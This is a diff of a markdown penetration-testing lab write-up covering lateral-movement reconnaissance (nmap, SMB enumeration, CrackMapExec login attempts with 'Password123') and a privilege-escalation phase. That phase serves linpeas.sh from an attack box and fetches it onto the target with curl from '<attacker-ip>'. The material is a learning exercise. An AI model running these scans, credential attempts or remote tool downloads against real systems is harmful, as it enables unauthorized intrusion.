@@ -209,6 +209,7 @@ To simulate lateral movement by scanning for other hosts in the network, enumera
 #### 🔍 Step 1: Port Scanning of Other Internal Hosts
 Performed a full TCP port scan on two adjacent hosts `10.10.10.1` and `10.10.10.2`.
 
+### 🧾 Command Executed
 ```bash
 sudo nmap -sS -Pn -T4 -p- 10.10.10.1 -oN phase5_scan_10.10.10.1.txt
 sudo nmap -sS -Pn -T4 -p- 10.10.10.2 -oN phase5_scan_10.10.10.2.txt
@@ -220,6 +221,8 @@ sudo nmap -sS -Pn -T4 -p- 10.10.10.2 -oN phase5_scan_10.10.10.2.txt
 ### 🧾 Step 2: Enumeration on 10.10.10.1 (SMB)
 
 Attempted enumeration of SMB shares and domain info using anonymous credentials.
+
+### 🧾 Command Executed
 ```bash
 smbclient -L //10.10.10.1 -N
 enum4linux 10.10.10.1
@@ -232,6 +235,8 @@ enum4linux 10.10.10.1
 
 ### 🧾 Step 3: Targeted Port Scan for SMB (TCP 445)
 Confirmed SMB port state on both hosts to determine if SMB is reachable.
+
+### 🧾 Command Executed
 ```bash
 sudo nmap -p 445 10.10.10.1
 sudo nmap -p 445 10.10.10.2
@@ -248,6 +253,8 @@ sudo nmap -p 445 10.10.10.2
 ### 🔐 Step 4: SMB Authentication Testing (CrackMapExec)
 
 Tested authentication against both hosts using assumed credentials:
+
+### 🧾 Command Executed
 ```bash
 PYTHONWARNINGS="ignore" crackmapexec smb 10.10.10.1 -u administrator -p 'Password123'
 PYTHONWARNINGS="ignore" crackmapexec smb 10.10.10.2 -u administrator -p 'Password123'
@@ -282,3 +289,85 @@ PYTHONWARNINGS="ignore" crackmapexec smb 10.10.10.2 -u administrator -p 'Passwor
 
 🧪 Demonstrated lateral movement reconnaissance even when access was denied.
 
+## 🧭 Phase 6: Privilege Escalation Simulation
+
+---
+
+### 🎯 Objective
+
+To identify and exploit potential privilege escalation vectors on a compromised Linux system using both manual enumeration and automated tools.
+
+---
+
+### 🧪 Tools Used
+
+- `whoami`, `hostname` — for basic context gathering  
+- `linpeas.sh` — for privilege escalation enumeration  
+- `python3 -m http.server` — for hosting tools on the attack box  
+- `curl` — for downloading tools on the target machine  
+
+---
+
+### 🔍 Step-by-Step Process
+
+---
+
+#### 🔎 Step 1: Context Enumeration
+
+Gathered context by running the following commands to verify the current user and host identity:
+
+### 🧾 Command Executed
+```bash
+whoami
+hostname
+```
+### 🖼 Screenshots
+![Context Enumeration](./screenshots/proof_of_concepts/phase6/context_enum.png)
+
+### 🧪 Step 2: Upload Enumeration Tool to Target
+
+Set up an HTTP server on the attack machine to host linpeas.sh:
+
+### 🧾 Command Executed
+```bash
+cd /path/to/linpeas
+python3 -m http.server 8000
+```
+Then downloaded the tool from the victim machine:
+```bash
+curl http://<attacker-ip>:8000/linpeas.sh -o linpeas.sh
+chmod +x linpeas.sh
+```
+### 🖼 Screenshots
+![File Transfer - Upload Tool](./screenshots/proof_of_concepts/phase6/upload_tool_transfer.png)
+
+### 🚀 Step 3: Execute Tool and Analyze Output
+
+Executed the linPEAS tool on the target system to scan for misconfigurations and privilege escalation vectors:
+
+### 🧾 Command Executed
+```bash
+./linpeas.sh
+```
+### Notable Results:
+
+    The current user is already root.
+
+    linPEAS confirmed several tools available for post-exploitation: nmap, bash, nc, fping, etc.
+
+    The OS is Kali Linux running Kernel version 6.12.13.
+
+### 🖼 Screenshots
+![LinPEAS Root Execution](./screenshots/proof_of_concepts/phase6/linpeas_root_check.png)
+
+### ✅ Summary of Findings
+| Area                 | Result / Observation                            |
+| -------------------- | ----------------------------------------------- |
+| Current User         | `root` (already escalated)                      |
+| Hostname             | `original-hostname`                             |
+| Kernel Version       | `6.12.13-amd64 (Kali)`                          |
+| Privilege Escalation | Not required – user already has root privileges |
+| Tools Detected       | `nmap`, `bash`, `nc`, `fping`                   |
+
+### 💡 Conclusion
+The target Linux system was already operating under root privileges, rendering privilege escalation unnecessary. However, running linpeas.sh validated system environment details and revealed key misconfigurations and tools that would otherwise aid in post-exploitation steps. This phase showcases how to verify privilege levels and use enumeration tools in preparation for escalation, even if it's ultimately not required.
